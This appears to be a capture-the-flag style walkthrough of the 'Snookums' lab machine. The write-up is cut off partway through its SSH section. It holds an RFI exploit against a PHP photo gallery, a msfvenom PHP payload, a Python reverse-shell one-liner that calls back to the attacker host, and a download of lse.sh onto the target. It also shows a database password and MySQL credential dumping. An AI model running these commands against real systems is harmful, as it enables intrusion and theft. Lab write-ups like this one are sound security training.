# Snookums

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Sun Feb 13 06:16:14 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Snookums/results/192.168.161.58/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Snookums/results/192.168.161.58/scans/xml/_full_tcp_nmap.xml" 192.168.161.58
Nmap scan report for 192.168.161.58
Host is up, received user-set (0.17s latency).
Scanned at 2022-02-13 06:16:15 EST for 387s
Not shown: 65527 filtered ports
Reason: 65527 no-responses
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 63 vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.161
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtUk/m8ssh+nfn52VkolWbpJihGyH2vdELXJv/X0HIj5hbkXnM1QgSSKltTq+cev1QtkrwtUTV3j2AD5Ftxz7ivrm0PvsGNI6QGnIxdAwCvt1OjDHoz6IGDS4kz5IcW3Q3SmwceCwDKPA55mupKhKlKjkZyLn4+d9An50AV1Hyj+E8APALHQBQFVp7cdJe9lqj7K8dxNVo1XExUDgU3trRSGDO5bZN7C57VsHXN6MIITU9RtyMhLbxYwA6KTU8RluW1/5v7T4EnHlRZcdmbneVcefK+EK69Mgdn5L+ww/5YrWiYbXDOUTEymWfeyoOl2LoFBD/nmSb9hayKirR4guf
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOk5HGeIHhlXkWc9v507Ap0zc5wnKxhGa7WG9fWJhL/yr9bveHEBZllHErnP6vaWM4WRudCxA6z6rqnhep9wNW8=
|   256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDvde70kt/TjqXRmChJ0XvKYTpljMNu6TKlAtF/S4IHL
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp   open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       syn-ack ttl 63 MySQL (unauthorized)
33060/tcp open  socks5      syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: 
|     Invalid message"
|     HY000
|   Radmin: 
|     authentication.mechanisms
|     MYSQL41
|     SHA256_MEMORY
|     doc.formats
|     text
|     client.interactive
|     compression
|     algorithm
|     deflate_stream
|     lz4_message
|     zstd_stream
|     node_type
|     mysql
|_    client.pwd_expire_ok
| socks-auth-info: 
|   No authentication
|   No authentication
|_  No authentication
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.91%I=9%D=2/13%Time=6208E96F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Hello,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20m
SF:essage\"\x05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x0
SF:8\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(SSLv23SessionRe
SF:q,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInv
SF:alid\x20message\"\x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchR
SF:eq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\
SF:x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\
SF:x05\x1a\0")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInval
SF:id\x20message\"\x05HY000")%r(DistCCD,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%
SF:r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Radmin,15D,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0P\x01\0\0\x02\n\x0f\n\x03tls\x12\x08\x08\x01\x12\x04\x08
SF:\x07@\0\nM\n\x19authentication\.mechanisms\x120\x08\x03\",\n\x11\x08\x0
SF:1\x12\r\x08\x08J\t\n\x07MYSQL41\n\x17\x08\x01\x12\x13\x08\x08J\x0f\n\rS
SF:HA256_MEMORY\n\x1d\n\x0bdoc\.formats\x12\x0e\x08\x01\x12\n\x08\x08J\x06
SF:\n\x04text\n\x1e\n\x12client\.interactive\x12\x08\x08\x01\x12\x04\x08\x
SF:07@\0\nn\n\x0bcompression\x12_\x08\x02\x1a\[\nY\n\talgorithm\x12L\x08\x
SF:03\"H\n\x18\x08\x01\x12\x14\x08\x08J\x10\n\x0edeflate_stream\n\x15\x08\
SF:x01\x12\x11\x08\x08J\r\n\x0blz4_message\n\x15\x08\x01\x12\x11\x08\x08J\
SF:r\n\x0bzstd_stream\n\x1c\n\tnode_type\x12\x0f\x08\x01\x12\x0b\x08\x08J\
SF:x07\n\x05mysql\n\x20\n\x14client\.pwd_expire_ok\x12\x08\x08\x01\x12\x04
SF:\x08\x07@\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X|5.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:5.1
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.12 (91%), Linux 4.4 (91%), Linux 4.9 (91%), Linux 3.10 (86%), Linux 3.10 - 3.16 (86%), Linux 4.0 (86%), Linux 3.10 - 4.11 (85%), Linux 3.11 - 4.1 (85%), Linux 3.18 (85%), Linux 3.2 - 4.9 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/13%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6208EA02%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10A%TI=Z%TS=A)
SEQ(SP=102%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.006 days (since Sun Feb 13 06:14:27 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: SNOOKUMS; OS: Unix

Host script results:
|_clock-skew: mean: 1h45m55s, deviation: 2h53m14s, median: 5m53s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20684/tcp): CLEAN (Timeout)
|   Check 2 (port 51108/tcp): CLEAN (Timeout)
|   Check 3 (port 33406/udp): CLEAN (Timeout)
|   Check 4 (port 48023/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: snookums
|   NetBIOS computer name: SNOOKUMS\x00
|   Domain name: \x00
|   FQDN: snookums
|_  System time: 2022-02-13T06:27:57-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-13T11:27:58
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   173.04 ms 192.168.49.1
2   172.57 ms 192.168.161.58

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 13 06:22:42 2022 -- 1 IP address (1 host up) scanned in 388.05 seconds
```

## 21 - FTP

Failed credentials
```
anonymous
admin:admin
admin:password
guest:guest
backup:backup
```

## 80 - Web 

![](Pasted%20image%2020220213193846.png)

```
```

![](Pasted%20image%2020220213195842.png)

https://github.com/andpp/PHP_Photo_Gallery

## 139,445 - Samba

```
┌──(kali㉿kali)-[/tmp]
└─$ smbmap -H 192.168.161.58    
[+] IP: 192.168.161.58:445      Name: 192.168.161.58                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.10.4)
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## 3306 - MySQL

```
┌──(kali㉿kali)-[/tmp]
└─$ mysql -h 192.168.161.58 -u root                                                                                                                               130 ⨯
ERROR 1130 (HY000): Host '192.168.49.161' is not allowed to connect to this MySQL server
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

# Exploit

## RFI Exploit 

https://www.google.com/search?q=Simple+PHP+Photo+Gallery+v0.8+-Snookums&rlz=1C1ONGR_enSG945SG945&sxsrf=APq-WBvPl8tA6pYWXLFYCuuKT-mFq96mrQ%3A1644758444737&ei=rAUJYprPLPC-3LUPieSmkAw&ved=0ahUKEwia1dvW4vz1AhVwH7cAHQmyCcIQ4dUDCA4&uact=5&oq=Simple+PHP+Photo+Gallery+v0.8+-Snookums&gs_lcp=Cgdnd3Mtd2l6EAM6CAgAEIAEELADOgcIABCwAxAeOgUIABCABEoECEEYAUoECEYYAFDfAVidD2ClEGgBcAB4AIABaogB3gOSAQM5LjGYAQCgAQHIAQbAAQE&sclient=gws-wiz
https://www.exploit-db.com/exploits/48424

![](Pasted%20image%2020220213212900.png)

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.161.58 - - [13/Feb/2022 08:29:12] "GET /a.png HTTP/1.0" 200 -
192.168.49.161 - - [13/Feb/2022 08:29:13] "GET /a.png HTTP/1.1" 304 -
```


![](Pasted%20image%2020220213213615.png)

### Text files

```
┌──(kali㉿kali)-[/tmp]
└─$ echo "1" > t                  
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.161.58 - - [13/Feb/2022 08:33:01] "GET /t HTTP/1.0" 200 -
```

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.161.58/image.php?img=http://192.168.49.161/t | tail
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1533  100  1533    0     0    809      0  0:00:01  0:00:01 --:--:--   808
        field.focus();
        field.select();
}

</script>
<!-- end javascript -->


<center><a href=''>Back to Gallery</a><center><img id='thepic' onClick='scaleImg()' src='http://192.168.49.161/t' /><script language='javascript'>setImgWidth_handler();</script></center>1
<br /><center>Simple PHP Photo Gallery v0.8</center>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## Reverse Shell
```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p php/reverse_php LHOST=192.168.49.161 LPORT=33060  -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3032 bytes
Saved as: shell.php
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.161.58 - - [13/Feb/2022 08:43:58] "GET /shell.php HTTP/1.0" 200 -
```

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.161.58/image.php?img=http://192.168.49.161/shell.php & nc -nlvp 33060                                                                       1 ⚙
[2] 10226
listening on [any] 33060 ...
connect to [192.168.49.161] from (UNKNOWN) [192.168.161.58] 46636
ls /usr/bin | grep python
python
python2
python2.7
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.161",33060));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 33060            
listening on [any] 33060 ...
connect to [192.168.49.161] from (UNKNOWN) [192.168.161.58] 46638
sh-4.2$ whoami
whoami
apache
sh-4.2$ ls /home
ls /home
michael
sh-4.2$ ls /home/michael
ls /home/michael
ls: cannot open directory /home/michael: Permission denied
sh-4.2$ su michael
su michael
Password: michael

su: Authentication failure
sh-4.2$ ls
ls
README.txt               image.php    phpGalleryConfig.php
UpgradeInstructions.txt  images       phpGalleryStyle-RED.css
css                      index.php    phpGalleryStyle.css
db.php                   js           phpGallery_images
embeddedGallery.php      license.txt  phpGallery_thumbs
functions.php            photos       thumbnail_generator.php
sh-4.2$ cd /
cd /
sh-4.2$ ls
ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
sh-4.2$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
michael:x:1000:1000:Michael:/home/michael:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash
sh-4.2$ 
```

# Privesc to Michael - Credential Reuse

## lse

```
sh-4.2$ wget 192.168.49.161/lse.sh
wget 192.168.49.161/lse.sh
--2022-02-13 08:57:10--  http://192.168.49.161/lse.sh
Connecting to 192.168.49.161:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: 'lse.sh'

100%[======================================>] 43,570       117KB/s   in 0.4s   

2022-02-13 08:57:11 (117 KB/s) - 'lse.sh' saved [43570/43570]

sh-4.2$ chmod +x lse.sh
chmod +x lse.sh
sh-4.2$ .//lse.sh
.//lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          

---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: apache
     User ID: 48
    Password: none
        Home: /usr/share/httpd
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
       umask: 0022

    Hostname: snookums
       Linux: 3.10.0-1127.10.1.el7.x86_64
Distribution: CentOS Linux 7 (Core)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ nope
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'apache' have mail?........................................ nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'apache'.................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... yes!                                                                                        
---
GitRekt:$1$GitRekt$FzDARwVLdGr6swDMInZda1:0:0::/root:/bin/bash
---
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. yes!
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. yes!
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. nope
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
sh-4.2$
```

## File Enum

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 33060            
listening on [any] 33060 ...
connect to [192.168.49.161] from (UNKNOWN) [192.168.161.58] 46652
sh-4.2$ ls
ls
README.txt               image.php    phpGalleryConfig.php
UpgradeInstructions.txt  images       phpGalleryStyle-RED.css
css                      index.php    phpGalleryStyle.css
db.php                   js           phpGallery_images
embeddedGallery.php      license.txt  phpGallery_thumbs
functions.php            photos       thumbnail_generator.php
sh-4.2$ cat db.php
cat db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
sh-4.2$ pwd
pwd
/var/www/html
sh-4.2$ 
```

## DB

```
sh-4.2$ cat db.php
cat db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
sh-4.2$ mysql -u root -pMalapropDoffUtilize1337
mysql -u root -pMalapropDoffUtilize1337
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1211
Server version: 8.0.20 MySQL Community Server - GPL

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| SimplePHPGal       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use SimplePHPGal;  
use SimplePHPGal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)

mysql> 
```

## SSH

```
┌──(kali㉿kali)-[~]
└─$ echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d
SG9ja1N5ZG5leUNlcnRpZnkxMjM=                                                                                   
┌──(kali㉿kali)-[~]
